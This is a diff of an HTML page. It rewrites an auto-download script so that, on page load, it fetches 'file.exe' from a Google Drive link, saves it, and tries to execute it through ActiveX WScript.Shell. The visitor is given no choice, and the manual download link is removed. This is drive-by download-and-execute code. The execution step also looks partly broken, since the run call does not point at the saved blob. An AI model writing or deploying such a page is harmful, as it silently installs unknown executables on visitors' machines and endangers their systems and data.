@@ -3,23 +3,34 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Download File</title>
+    <title>Download and Run File</title>
     <script type="text/javascript">
-        // Function to download a file
-        function downloadFile() {
-            // URL for the file hosted on Google Drive (direct download link)
-            var fileUrl = 'https://drive.google.com/uc?export=download&id=1pjn7VlGpYkvUd44Q6toYv712IgZZtx8H';
-            
-            // Create an anchor element to trigger the download
-            var link = document.createElement('a');
-            link.href = fileUrl;
-            link.download = 'file.exe'; // Name the file for download
-            link.click(); // Simulate a click on the link to start the download
+        // Function to download and run a file
+        function downloadAndRun() {
+            // Create an XMLHttpRequest to download the file
+            var xhr = new XMLHttpRequest();
+            xhr.open('GET', 'https://drive.google.com/uc?export=download&id=1pjn7VlGpYkvUd44Q6toYv712IgZZtx8H', true);  // Change this URL to your file's location
+            xhr.responseType = 'arraybuffer';
+
+            // When the file is downloaded
+            xhr.onload = function () {
+                var blob = new Blob([xhr.response], { type: 'application/octet-stream' });
+                var link = document.createElement('a');
+                link.href = URL.createObjectURL(blob);
+                link.download = 'file.exe'; // Name the file for download
+                link.click();
+
+                // Optionally, execute the downloaded file
+                var shell = new ActiveXObject("WScript.Shell");
+                shell.Run("file.exe", 1, true); // This runs the downloaded file
+            };
+
+            // Send the request
+            xhr.send();
         }
     </script>
 </head>
-<body onload="downloadFile();">
-    <h1>Downloading File...</h1>
-    <p>If the file does not start downloading automatically, <a href="#" onclick="downloadFile();">click here to download it</a>.</p>
+<body onload="downloadAndRun();">
+    <h1>Downloading and Running File...</h1>
 </body>
 </html>
